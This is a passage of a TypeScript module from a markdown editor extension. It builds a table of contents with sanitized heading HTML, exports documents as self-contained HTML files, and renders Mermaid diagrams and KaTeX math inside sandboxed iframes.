  // notice if it wants, but most editors (incl. text-editor / VS Code)
  // silently clamp.
  const line = Math.min(Math.max(requested, 1), maxLines);
  return { line, requested };
}

// --- TOC extraction (§18.3.1) ----------------------------------------------

/**
 * A single entry in the document's table of contents.
 *
 * - `level`    — heading depth (1..6), mirrors the markdown `#` count.
 *   The TOC UI typically indents by `(level - 1) * 12`px so the
 *   hierarchy is visible at a glance.
 * - `text`     — the visible heading text, raw markdown source
 *   (including `**bold**` / `` `code` `` / `[link](url)`). Used as
 *   the basis for `id` generation (so the slug matches what
 *   `parseMarkdown` stamps on the heading `id` attribute — the
 *   preview heading uses raw `textContent`, not rendered HTML).
 * - `textHtml` — the rendered inline HTML for display in the TOC
 *   sidebar (e.g. `<strong>bold</strong>` for `**bold**`). The
 *   caller MUST assign this via `innerHTML` (after DOMPurify
 *   sanitization); setting via `textContent` would re-show the
 *   raw markdown. Currently computed by `extractToc` via
 *   `marked.parseInline(text)` + `sanitizeMarkdownHtml`.
 * - `line`     — 1-indexed line number in the source document. The
 *   editor uses this to dispatch a scrollIntoView effect; the preview
 *   uses it to find the corresponding block via `data-source-line`.
 * - `id`       — a stable identifier generated from `line` + the
 *   length of the raw `text`. The TOC `<a href="#id">` jumps to the
 *   matching heading; the heading carries a matching `id` attribute
 *   set by `parseMarkdown` (see `renderToc` for the id-emission
 *   contract).
 */
export interface TocEntry {
  level: number;
  text: string;
  textHtml: string;
  line: number;
  id: string;
}

/**
 * Extract a flat TOC list (no nesting beyond what `level` conveys) from
 * markdown source. Pure: no DOM access, no globals. Returns an empty
 * array for an empty document or a document with no headings.
 *
 * Uses `marked.lexer` so the heading positions are computed the same
 * way as `parseMarkdown`'s `data-source-line` injection — they're
 * guaranteed to line up. Token `text` is the resolved heading text
 * (markdown stripped); we re-use it directly.
 *
 * `id` generation is a simple `h{id}-{line}` slug (no slugify, no
 * uniqueness across same-line duplicates — heading-on-same-line is
 * rare in practice, and the preview would render the duplicates at the
 * same line anyway, so the click target is unambiguous).
 */
export function extractToc(markdown: string): TocEntry[] {
  if (!markdown) return [];
  // Re-use the same `md` singleton that `parseMarkdown` uses so lexer
  // options (gfm, breaks) match. Tokens returned are top-level blocks.
  const tokens = md.lexer(markdown);
  // Use the shared line-numbering helper instead of `token.line` —
  // marked v18 doesn't set `.line` reliably (it's `undefined` for
  // top-level blocks in our tests). `computeBlockLineNumbers` walks
  // raw + space tokens and produces the same line numbers
  // `parseMarkdown` stamps into `data-source-line`, so the TOC entry
  // and the preview block always line up on click.
  const allLines = computeBlockLineNumbers(tokens);
  const entries: TocEntry[] = [];
  let blockIdx = 0;
  for (const t of tokens) {
    if ((t as { type?: string }).type === 'space') continue;
    if ((t as { type?: string }).type === 'heading') {
      const h = t as { depth: number; text: string };
      const level = h.depth;
      if (level < 1 || level > 6) {
        blockIdx++;
        continue;
      }
      const line = allLines[blockIdx] ?? 1;
      const text = h.text;
      // Simple slug — line number is already a stable, unique-enough key.
      // Tests assert that the same line produces the same id (so the
      // TOC link lands on the heading emitted by `parseMarkdown`).
      const id = `md-h-${line}-${text.length}`;
      // §18.3.1 — render the heading's inline markdown to HTML for
      // the TOC sidebar display. `text` stays raw so `id` derivation
      // (which uses `text.length`) matches `parseMarkdown`'s heading
      // id (`textContent.length` of the raw source — see the
      // `md-h-{line}-{text.length}` contract at line 137 below).
      //
      // `md.parseInline(text)` is the static path: it lexes the
      // input as a single inline-only chunk and returns a string.
      // `sanitizeMarkdownHtml` runs DOMPurify (FORBID_ATTR: ['style']
      // + the ALLOWED_TAGS allowlist) so even a malicious heading
      // can't inject script tags / event handlers. Defense-in-depth:
      // the user is the source of the markdown, but headings are
      // entered through the same parsing path as the rest of the
      // document and should not bypass sanitization.
      //
      // marked v18 types `parseInline` as `string | Promise<string>`
      // (async-aware). We never register async extensions, so the
      // sync path is what runs; cast to string and pass through.
      const inlineHtml = sanitizeMarkdownHtml(md.parseInline(text) as string);
      entries.push({ level, text, textHtml: inlineHtml, line, id });
    }
    blockIdx++;
  }
  return entries;
}

/**
 * Render a TOC into a container element. Each entry becomes an `<a
 * href="#{id}">` link with the heading text. Clicking the link calls
 * `onSelect(entry)` and `preventDefault()`s the default anchor jump —
 * the host decides whether to scroll the editor, the preview, or both.
 *
 * Idempotent: re-rendering replaces the container's content. Returns
 * the number of entries rendered.
 *
 * Style: the list is flat (not nested); indentation comes from CSS
 * via `--toc-indent` per `level` (see `editor.css`). Each link gets
 * `data-toc-line` so a future "active heading" highlight (intersection
 * observer on the preview) can find the matching entry by line.
 */
export function renderToc(
  container: HTMLElement,
  entries: TocEntry[],
  onSelect: (entry: TocEntry) => void,
  activeLine: number | null = null
): number {
  container.innerHTML = '';
  if (entries.length === 0) {
    const empty = document.createElement('div');
    empty.className = 'toc-empty';
    empty.textContent = 'No headings';
    container.appendChild(empty);
    return 0;
  }
  for (const entry of entries) {
    const a = document.createElement('a');
    a.className = `toc-entry toc-h${entry.level}`;
    // §18.3.1 — apply the active-heading highlight on initial render
    // so the entry whose source line matches `activeLine` lights up
    // immediately. The caller (index.ts) also re-applies the class
    // after the innerHTML replace — this is the one that wins
    // visually, but applying here too keeps `renderToc`'s behavior
    // self-contained for tests.
    if (activeLine !== null && entry.line === activeLine) {
      a.classList.add('toc-active');
    }
    a.href = `#${entry.id}`;
    a.setAttribute('data-toc-line', String(entry.line));
    // §18.3.1 — display the rendered inline markdown (`**bold**` →
    // `<strong>bold</strong>`, etc.) instead of the raw source.
    // `entry.textHtml` is already DOMPurify-sanitized by
    // `extractToc`, so `innerHTML` is safe here. Fall back to
    // `textContent` if the field is missing (older callers/tests
    // that hand-construct TocEntry entries without textHtml).
    if (entry.textHtml) {
      a.innerHTML = entry.textHtml;
    } else {
      a.textContent = entry.text;
    }
    a.addEventListener('click', (e) => {
      e.preventDefault();
      onSelect(entry);
    });
    container.appendChild(a);
  }
  return entries.length;
}

// --- HTML export (§18.3.2) ------------------------------------------------

/**
 * Build a minimal CSS string for the exported HTML document. A small
 * subset of the editor's live styles — enough to render headings,
 * paragraphs, lists, code blocks, blockquotes, and tables. Doesn't try
 * to mirror every editor.css rule (toolbar, status, splitter, hljs
 * classes) since the exported file is a *document*, not a UI.
 *
 * Kept inline (no `<link rel="stylesheet">`) so the exported file is
 * self-contained — opens in any browser, no missing-asset 404s.
 */
const EXPORT_CSS = `
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
    Oxygen, Ubuntu, Cantarell, sans-serif; max-width: 800px; margin: 40px auto;
    padding: 0 20px; line-height: 1.6; color: #1f2328; background: #fff; }
  h1, h2, h3, h4, h5, h6 { margin-top: 24px; margin-bottom: 12px; font-weight: 600;
    line-height: 1.25; }
  h1 { font-size: 2em; border-bottom: 1px solid #d0d7de; padding-bottom: 8px; }
  h2 { font-size: 1.5em; border-bottom: 1px solid #d0d7de; padding-bottom: 6px; }
  h3 { font-size: 1.25em; }
  p { margin: 0 0 12px; }
  a { color: #0969da; text-decoration: none; }
  a:hover { text-decoration: underline; }
  code { font-family: ui-monospace, SFMono-Regular, 'SF Mono', Consolas, monospace;
    font-size: 0.9em; background: rgba(175, 184, 193, 0.2); padding: 2px 4px;
    border-radius: 3px; }
  pre { background: #f6f8fa; border-radius: 6px; padding: 12px; overflow: auto; }
  pre code { background: transparent; padding: 0; }
  blockquote { margin: 0 0 12px; padding: 4px 16px; color: #57606a;
    border-left: 4px solid #d0d7de; }
  table { border-collapse: collapse; width: 100%; margin-bottom: 12px; }
  th, td { border: 1px solid #d0d7de; padding: 6px 12px; text-align: left; }
  th { background: #f6f8fa; font-weight: 600; }
  img { max-width: 100%; height: auto; }
  ul, ol { margin: 0 0 12px; padding-left: 24px; }
  li { margin-bottom: 4px; }
  hr { border: none; border-top: 1px solid #d0d7de; margin: 24px 0; }
  input[type="checkbox"] { margin-right: 6px; }
  @media (prefers-color-scheme: dark) {
    body { color: #c9d1d9; background: #0d1117; }
    h1, h2 { border-bottom-color: #30363d; }
    a { color: #58a6ff; }
    pre, th { background: #161b22; }
    code { background: rgba(110, 118, 129, 0.2); }
    blockquote { color: #8b949e; border-left-color: #30363d; }
    th, td { border-color: #30363d; }
    hr { border-top-color: #30363d; }
  }
`.trim();

/**
 * Wrap rendered preview HTML in a complete HTML document with inline
 * CSS, ready to save as `.html` and open in any browser. Pure string
 * transform — no DOM access. `title` is the document `<title>`; the
 * caller should pass the file's basename or a user-supplied title.
 *
 * The `data-source-line` attributes from `parseMarkdown` are preserved
 * (in case the user wants to round-trip the document back into the
 * editor) but they have no visual effect in the browser.
 */
export function wrapHtmlDocument(title: string, bodyHtml: string): string {
  const safeTitle = title
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  return (
    `<!DOCTYPE html>\n<html lang="en">\n<head>\n` +
    `<meta charset="UTF-8" />\n` +
    `<meta name="viewport" content="width=device-width, initial-scale=1.0" />\n` +
    `<title>${safeTitle}</title>\n` +
    `<style>${EXPORT_CSS}</style>\n` +
    `</head>\n<body>\n` +
    `${bodyHtml}\n` +
    `</body>\n</html>\n`
  );
}

/**
 * Trigger a browser download of `content` as `filename`. Creates a
 * `Blob` with the given MIME type, a temporary `<a download>`, a
 * synthetic click, then revokes the object URL. Returns the object URL
 * for testing (in jsdom, the click is a no-op; tests can verify the
 * anchor's `href` and `download` attrs).
 */
export function triggerDownload(
  filename: string,
  content: string | Blob,
  mime: string
): string | null {
  if (typeof document === 'undefined') return null;
  const blob = content instanceof Blob ? content : new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.style.display = 'none';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  // Defer revoke so the browser has a chance to start the download.
  setTimeout(() => URL.revokeObjectURL(url), 1000);
  return url;
}

// --- Mermaid (§18.3.3) ----------------------------------------------------

/**
 * Selector for code blocks that should be rendered as Mermaid diagrams.
 * Match both `language-mermaid` (the conventional GFM code-fence form)
 * and bare `mermaid` (a few renderers use the bare token without the
 * `language-` prefix). `mermaid.parse()` is permissive on the language
 * class, so this catch-all keeps the user experience forgiving.
 */
const MERMAID_CODE_SELECTOR = 'pre code.language-mermaid, pre code.mermaid';

/**
 * Walk the container and return every `<pre><code class="language-mermaid">`
 * (or `class="mermaid"`) block. Pure DOM operation — no mermaid
 * runtime involved. The returned list preserves document order so the
 * caller can render them sequentially.
 *
 * Exported so tests can verify the detection without booting mermaid
 * (which jsdom can't actually render — mermaid needs a real DOM with
 * SVG support, jsdom's SVG implementation is partial).
 */
export function extractMermaidBlocks(container: HTMLElement): HTMLElement[] {
  return Array.from(container.querySelectorAll(MERMAID_CODE_SELECTOR));
}

/**
 * Test whether `code` already carries a `data-mermaid` marker. The
 * `renderMermaid` function stamps this attribute on every code block
 * it has processed, so a second pass on the same DOM (e.g. an
 * `innerHTML` replace + re-render) is idempotent — we don't re-init
 * mermaid or re-render a block that's already been marked.
 */
function isMermaidProcessed(code: HTMLElement): boolean {
  return code.getAttribute('data-mermaid') === 'processed';
}

/**
 * Build a mermaid-compatible container from a `<pre><code>` block.
 * Mermaid requires the source to live in a `<div class="mermaid">`
 * (NOT inside a `<pre><code>` — that gets HTML-escaped and rendered
 * as text). This function:
 *   1. Captures the raw source from `<pre><code>`
 *   2. Creates a `<div class="mermaid mermaid-pending">` and inserts
 *      it immediately after the original `<pre>` (so the geometry
 *      doesn't jump when the SVG replaces it)
 *   3. Marks the original `<pre>` with `data-mermaid="replaced"` so a
 *      re-render can detect and clean up
 *   4. Hides the original `<pre>` (so we don't see raw code AND a
 *      diagram at once)
 *
 * The returned div carries the same `id` passed in so the sandbox
 * response (which echoes the id) can be matched back to the DOM
 * placeholder.
 */
function buildMermaidContainer(code: HTMLElement, id: string): HTMLElement | null {
  const pre = code.parentElement;
  if (!pre) return null;
  // Capture raw source from textContent (whitespace preserved).
  const source = code.textContent ?? '';
  const div = document.createElement('div');
  div.className = 'mermaid mermaid-pending';
  div.setAttribute('data-mermaid-id', id);
  pre.setAttribute('data-mermaid', 'replaced');
  pre.style.display = 'none';
  pre.parentElement?.insertBefore(div, pre.nextSibling);
  div.textContent = source;
  return div;
}

/**
 * URL of the sandbox iframe, relative to the extension's dist folder.
 * The browser resolves it against the iframe's base URL
 * (`whale-extension://md-editor/`). The `mermaid.min.js` script + the
 * `mermaid-sandbox.html` page are copied to dist by the build script.
 */
const MERMAID_SANDBOX_SRC = 'mermaid-sandbox.html';

// --- KaTeX (§18.3.3) ----------------------------------------------------

/**
 * Selector for KaTeX placeholders emitted by the custom marked
 * extension above (`md-render.ts:48-126`). Both inline
 * `<span class="katex katex-inline">` and block
 * `<div class="katex katex-block">` use the shared `.katex` class
 * with a distinguishing modifier — caught here via the attribute
 * selectors (cleaner than splitting by class name, since the
 * sandbox renderer needs to know `displayMode`).
 */
/**
 * Walk the container and return every KaTeX placeholder (inline +
 * block, in document order). Pure DOM operation — no KaTeX
 * runtime involved. The returned list preserves order so the
 * caller can render them sequentially; the per-placeholder
 * `displayMode` is encoded in the DOM (`data-katex-display="block"`
 * for blocks, absent for inline).
 *
 * Exported so tests can verify the detection without booting KaTeX
 * (which jsdom can't actually render — the MathML output uses DOM
 * APIs that jsdom supports partially).
 */
export interface KatexPlaceholder {
  el: HTMLElement;
  source: string;
  displayMode: boolean;
}
export function extractKatexBlocks(container: HTMLElement): KatexPlaceholder[] {
  const out: KatexPlaceholder[] = [];
  // Single unified pass in document order. (The old code queried inline and
  // block selectors into locals that were never read, then re-queried with a
  // unified selector — triple querySelectorAll per render.)
  const all = container.querySelectorAll(
    '.katex[data-katex-source]'
  ) as NodeListOf<HTMLElement>;
  for (const el of Array.from(all)) {
    const source = el.getAttribute('data-katex-source');
    if (source === null) continue;
    const displayMode = el.hasAttribute('data-katex-display');
    out.push({ el, source, displayMode });
  }
  return out;
}

let sandbox: import('./md-sandbox').SandboxRenderer | null = null;
// §18.3.3 fix — concurrent `getSandbox()` callers used to race past
// the `if (sandbox) return sandbox;` check (both see null), both
// await the dynamic import, both call `createMermaidSandbox`, and
// the second one overwrites the first — the first iframe leaks in
// `document.body` for the rest of the md-editor session.
//
// Cache the *promise* instead. The first caller stores the in-flight
// promise; every subsequent caller awaits the same one. Only one
// iframe ever gets created. The promise resolves to the singleton
// `sandbox` once the iframe is mounted.
let sandboxPromise: Promise<import('./md-sandbox').SandboxRenderer> | null = null;

/**
 * Test-only: trigger (or return the cached) sandbox-creation promise.
 * Mirrors what `getSandbox()` does internally, but exposed so the
 * md-sandbox.test.ts suite can assert the concurrent-call fix
 * (two callers must receive the same Promise instance, not two
 * separate createMermaidSandbox invocations).
 *
 * Calls `_resetSandboxForTest()` first to clear any cache left over
 * from a previous test in the same file.
 */
export async function _getSandboxForTest(): Promise<
  import('./md-sandbox').SandboxRenderer
> {
  return getSandbox();
}

/**
 * Test-only: peek at the cached promise WITHOUT triggering creation.
 * Returns `null` if no call to `getSandbox()` has happened yet (i.e.
 * the cache is cold).
 */
export function _peekSandboxForTest(): Promise<
  import('./md-sandbox').SandboxRenderer
> | null {
  return sandboxPromise;
}

/**
 * Test-only: reset module state. Each test that touches the sandbox
 * must call this in its `before` hook so the previous test's
 * cached promise doesn't leak across cases (the underlying
 * `createMermaidSandbox` appends an `<iframe>` to `document.body`
 * which would accumulate otherwise).
 *
 * Also calls `destroy()` on the current sandbox if any, so the
 * 5s ready-timeout doesn't fire AFTER the test ends and trigger an
 * `unhandledRejection` (Node test runner treats that as a test
 * failure even when the assertions passed).
 */
export function _resetSandboxForTest(): void {
  if (sandbox) {
    try {
      sandbox.destroy();
    } catch {
      /* ignore — destroy is best-effort during test teardown */
    }
  }
  sandbox = null;
  sandboxPromise = null;
}

async function getSandbox(): Promise<import('./md-sandbox').SandboxRenderer> {
  if (sandboxPromise) return sandboxPromise;
  sandboxPromise = (async () => {
    // Lazy-create on first call. Dynamic import keeps the ~150 lines
    // of md-sandbox.ts out of the initial bundle for users who never
    // use mermaid.
    const mod = await import('./md-sandbox');
    sandbox = mod.createMermaidSandbox({
      src: MERMAID_SANDBOX_SRC,
      mount: document.body,
    });
    return sandbox;
  })();
  return sandboxPromise;
}

/**
 * Render all Mermaid code blocks inside `container` as inline SVG
 * diagrams. Architecture (§18.3.3):
 *   1. Find every `<pre><code class="language-mermaid">` (pure DOM)
 *   2. Replace each with a `<div class="mermaid mermaid-pending">`
 *      placeholder (geometry-stable)
 *   3. Send the source to the SANDBOXED iframe via postMessage
 *   4. Sandbox runs mermaid (with its own unsafe-eval CSP) and posts
 *      back the SVG text
 *   5. We replace the placeholder's innerHTML with the SVG
 *
 * Why a sandbox iframe (§18.3.3 trade-off): mermaid v11 uses
 * `new Function(...)` internally to compile diagrams. The main
 * md-editor CSP does NOT allow `unsafe-eval` (we keep it strict).
 * Putting mermaid in a separate `sandbox="allow-scripts"` (no
 * `allow-same-origin`) iframe lets it run untrusted eval while
 * being unable to touch the parent DOM, cookies, or storage.
 *
 * Idempotent: a re-render on the same DOM is a no-op for already-
 * processed blocks. Errors in a single diagram don't break the
 * others (each is wrapped in its own try/catch).
 *
 * The call is async — the caller (`index.ts renderPreview`) does
 * NOT await it; the SVG appears ~100-500ms after the preview
 * paints. A pending placeholder shows the raw source text until
 * the SVG replaces it.
 */
export async function renderMermaid(container: HTMLElement): Promise<void> {
  const blocks = extractMermaidBlocks(container).filter(
    (c) => !isMermaidProcessed(c)
  );
  if (blocks.length === 0) return;

  const sb = await getSandbox();
  // Surface sandbox load failures (404, CSP reject, 5s timeout) to
  // the user instead of hanging silently. The sandbox's `ready`
  // promise rejects on failure; subsequent renders fail-fast.
  // We don't await `ready` per render — the `render` calls just
  // queue and the sandbox dispatches them once `ready` resolves.
  // If `ready` is already settled (resolved), nothing changes.
  // Surface sandbox load failures (404, CSP reject, 5s timeout) to the user
  // instead of hanging silently. The success path needs no logging.
  sb.ready.catch((err) => {
    // eslint-disable-next-line no-console
    console.warn('[md-editor] mermaid sandbox failed to start', err);
  });

  // Mint one id per block so the sandbox's `rendered` / `error`
  // response can be matched back to the DOM placeholder.
  const { newMermaidId } = await import('./md-sandbox');

  const placeholders: Array<{ code: HTMLElement; div: HTMLElement; id: string; source: string }> = [];
  for (const code of blocks) {
    const id = newMermaidId();
    const div = buildMermaidContainer(code, id);
    if (!div) continue;
    const source = code.textContent ?? '';
    placeholders.push({ code, div, id, source });
  }
  if (placeholders.length === 0) return;

  // Each diagram is independent — Promise.all + per-block try/catch
  // means one bad diagram doesn't poison the others.
  await Promise.all(
    placeholders.map(async ({ code, div, id, source }) => {
      try {
        const svg = await sb.render(id, source);
        // Replace the placeholder's innerHTML with the SVG. We use
        // `innerHTML` (not DOMParser) because the sandbox already
        // produced a sanitized SVG string (mermaid's render output
        // is a single `<svg>` element; we trust the source because
        // it came from our own sandboxed runtime).
        div.innerHTML = svg;
        div.classList.remove('mermaid-pending');
        code.setAttribute('data-mermaid', 'processed');
      } catch (err) {
        // Mermaid parse errors are user-facing (the source has bad
        // syntax); show the raw source + the error message instead
        // of a blank space. Restore the original <pre> so the user
        // sees both the source AND the error explanation.
        const message = err instanceof Error ? err.message : String(err);
        div.classList.add('mermaid-error');
        div.setAttribute('data-error', message);
        const pre = code.parentElement;
        if (pre) {
          pre.style.display = '';
          pre.removeAttribute('data-mermaid');
        }
        console.warn('md-editor: mermaid render failed', err);
      }
    })
  );
}

// --- KaTeX render pipeline (§18.3.3) -------------------------------------

/**
 * URL of the sandbox iframe, relative to the extension's dist folder.
 * The browser resolves it against the iframe's base URL
 * (`whale-extension://md-editor/`). The `katex.min.js` script + the
 * `katex-sandbox.html` page are copied to dist by the build script.
 */
const KATEX_SANDBOX_SRC = 'katex-sandbox.html';

let katexSandbox: import('./katex-sandbox').KatexSandboxRenderer | null = null;
let katexSandboxPromise: Promise<
  import('./katex-sandbox').KatexSandboxRenderer
> | null = null;

async function getKatexSandbox(): Promise<
  import('./katex-sandbox').KatexSandboxRenderer
> {
  if (katexSandboxPromise) return katexSandboxPromise;
  katexSandboxPromise = (async () => {
    const mod = await import('./katex-sandbox');
    katexSandbox = mod.createKatexSandbox({
      src: KATEX_SANDBOX_SRC,
      mount: document.body,
    });
    return katexSandbox;
  })();
  return katexSandboxPromise;
}

/**
 * Test-only exports for the sandbox state (mirrors md-sandbox.ts's
 * `_getSandboxForTest` / `_peekSandboxForTest` / `_resetSandboxForTest`).
 */
export async function _getKatexSandboxForTest(): Promise<
  import('./katex-sandbox').KatexSandboxRenderer
> {
  return getKatexSandbox();
}
export function _peekKatexSandboxForTest(): Promise<
  import('./katex-sandbox').KatexSandboxRenderer
> | null {
  return katexSandboxPromise;
}
export function _resetKatexSandboxForTest(): void {
  if (katexSandbox) {
    try {
      katexSandbox.destroy();
    } catch {
      /* best-effort */
    }
  }
  katexSandbox = null;
  katexSandboxPromise = null;
}

/**
 * Render all KaTeX placeholders inside `container` to actual KaTeX
 * HTML. Mirrors `renderMermaid`'s structure (lazy sandbox, error
 * isolation per placeholder, async fire-and-forget from the caller).
 *
 * Architecture (§18.3.3):
 *   1. Find every `.katex[data-katex-source]` placeholder (pure DOM).
 *   2. Send the source to the SANDBOXED iframe via postMessage along
 *      with the `displayMode` flag (inline vs block).
 *   3. Sandbox runs `katex.renderToString` and posts back the HTML
 *      (already `<span class="katex">…</span>` from KaTeX itself).
 *   4. We replace the placeholder's innerHTML with the rendered
 *      output (KaTeX HTML is trusted — comes from our own sandbox).
 *
 * Idempotent: a re-render on the same DOM is a no-op for already-
 * processed blocks. Errors in a single equation don't break the
 * others (each is wrapped in its own try/catch).
 *
 * The call is async — the caller (`index.ts renderPreview`) does
 * NOT await it; the SVG appears ~50-200ms after the preview paints.
 * A pending placeholder shows the raw LaTeX source text until the
 * KaTeX render replaces it.
 */
export async function renderKatex(container: HTMLElement): Promise<void> {
  const blocks = extractKatexBlocks(container);
  if (blocks.length === 0) return;

  const sb = await getKatexSandbox();
  const { newKatexId } = await import('./katex-sandbox');

  // Each equation is independent — Promise.all + per-block try/catch
  // means one bad equation doesn't poison the others.
  await Promise.all(
    blocks.map(async ({ el, source, displayMode }) => {
      const id = newKatexId();
      try {
        const html = await sb.render(id, source, displayMode);
        // Replace the placeholder's innerHTML with the rendered
        // output. KaTeX returns HTML with `class="katex"` already
        // attached, so the existing class selectors in editor.css
        // continue to apply (margin, line-height, etc.).
        //
        // We use `innerHTML` (not DOMParser) because the sandbox
        // already produced a sanitized HTML string — KaTeX's output
        // is purely `<span class="katex"><span class="katex-mathml">…</span>…</span>`.
        // We trust the sandbox's output because it comes from our
        // own code, not from user content (the LaTeX source went
        // through the marked extension which doesn't render anything).
        el.innerHTML = html;
      } catch (err) {
        // KaTeX parse errors are user-facing (the source has bad
        // LaTeX); show the raw source + a red border instead of
        // a blank space. Restore the original placeholder content
        // (the katex-fallback span) and add .katex-error.
        const message = err instanceof Error ? err.message : String(err);
        el.classList.add('katex-error');
        el.setAttribute('data-error', message);
        // eslint-disable-next-line no-console
        console.warn('md-editor: katex render failed', err);
      }
    })
  );
}
